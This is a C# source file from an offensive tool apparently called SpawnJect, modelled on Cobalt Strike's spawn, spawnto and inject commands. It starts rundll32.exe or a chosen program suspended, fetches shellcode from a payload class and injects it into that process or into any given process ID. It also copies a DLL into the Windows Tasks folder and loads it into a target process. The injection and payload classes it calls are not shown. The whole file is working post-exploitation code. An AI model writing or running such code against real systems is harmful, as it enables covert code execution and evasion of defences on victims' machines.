using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;

namespace SpawnJect.Commands
{

    class CommandOps
    {
        
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
        struct STARTUPINFO
        {
            public Int32 cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        static extern bool CreateProcess(
            string lpApplicationName,
            string lpCommandLine,
            IntPtr lpProcessAttributes,
            IntPtr lpThreadAttributes,
            bool bInheritHandles,
            uint dwCreationFlags,
            IntPtr lpEnvironment,
            string lpCurrentDirectory,
            [In] ref STARTUPINFO lpStartupInfo,
            out PROCESS_INFORMATION lpProcessInformation);

        public static void Spawn(bool x64Bit, string injMethod)
        {

            //cobalt strike spawn command starts rundll32.exe
            //after CreateProcess, get pid then OpenProcess


            Console.WriteLine("from Spawn()");

            string x86Exe = @"c:\windows\syswow64\rundll32.exe";
            string x64Exe = @"c:\windows\system32\rundll32.exe";

            STARTUPINFO si = new STARTUPINFO();
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();

            Console.WriteLine(x64Bit);

            byte[] buf;


            if (!x64Bit)
            {
                //CreateProcess x86 here

                bool x86Res = CreateProcess(
                null,
                x86Exe,
                IntPtr.Zero,
                IntPtr.Zero,
                false,
                0x4,
                IntPtr.Zero,
                null,
                ref si,
                out pi);

                buf = SpawnJect.Payloads.Payload.Getx86();

            }

            
            else
            {

                //CreateProcess x64 here

                bool x64Res = CreateProcess(
                null,
                x64Exe,
                IntPtr.Zero,
                IntPtr.Zero,
                false,
                0x4,
                IntPtr.Zero,
                null,
                ref si,
                out pi);

                buf = SpawnJect.Payloads.Payload.Getx64();
            }


            if (injMethod == "default")
            {
                SpawnJect.Injection.InjectionOps.DefaultInject(pi.dwProcessId, buf);
            }

            else if (injMethod == "alternate")
            {
                SpawnJect.Injection.InjectionOps.AlternateInject(pi.dwProcessId, buf);
            }

            else
            {
                Console.WriteLine("not supported");
                return;
            }

        
        }


        public static void Spawnto(string spawnProg, bool x64Bit, string injMethod)
        {

            Console.WriteLine("from Spawnto()");

            //cobalt strike spawnto command starts whatever exe you provide

            //check to ensure the program matches the arch
            //Issyswow64();

            STARTUPINFO si = new STARTUPINFO();
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();

            byte[] buf = SpawnJect.Payloads.Payload.Getx86();

            if (x64Bit)
            {
                buf = SpawnJect.Payloads.Payload.Getx64();
            }

            Console.WriteLine("prog: " + spawnProg);

            bool createRes = CreateProcess(
                null,
                spawnProg,
                IntPtr.Zero,
                IntPtr.Zero,
                false,
                0x4,
                IntPtr.Zero,
                null,
                ref si,
                out pi);

            if (injMethod == "default")
            {
                SpawnJect.Injection.InjectionOps.DefaultInject(pi.dwProcessId, buf);
            }

            else if (injMethod == "alternate")
            {
                SpawnJect.Injection.InjectionOps.AlternateInject(pi.dwProcessId, buf);
            }

            else
            {
                Console.WriteLine("not supported");
                return;
            }


        }


        public static void Inject(int pid, bool x64Bit, string injMethod)
        {

            Console.WriteLine("from Inject()");

            byte[] buf = SpawnJect.Payloads.Payload.Getx86();

            if (x64Bit)
            {
                buf = SpawnJect.Payloads.Payload.Getx64();
            }

            if (injMethod == "default")
            {
                SpawnJect.Injection.InjectionOps.DefaultInject(pid, buf);
            }

            else if (injMethod == "alternate")
            {
                SpawnJect.Injection.InjectionOps.AlternateInject(pid, buf);
            }

            else
            {
                Console.WriteLine("not supported");
                return;
            }
        }

        public static void DllInject(int pid, bool x64Bit, string injMethod, byte[] shellcode)
        {

            Console.WriteLine("from DllInject()");

            if (injMethod == "default")
            {
                SpawnJect.Injection.InjectionOps.DefaultInject(pid, shellcode);
            }

            else if (injMethod == "alternate")
            {
                SpawnJect.Injection.InjectionOps.AlternateInject(pid, shellcode);
            }

            else
            {
                Console.WriteLine("not supported");
                return;
            }
        }

        public static void DllLoad(int pid, bool x64Bit, string dllpath)
        {
            Console.WriteLine("from DllLoad()");
            byte[] data = System.IO.File.ReadAllBytes(dllpath);

            //Write the DLL to this path, assuming it's still writable
            String dir = @"C:\Windows\System32\Tasks\taskcomp.dll";
            System.IO.File.WriteAllBytes(dir, data);
            SpawnJect.Injection.InjectionOps.DLLLoad(pid, dir);
        }
    }
}
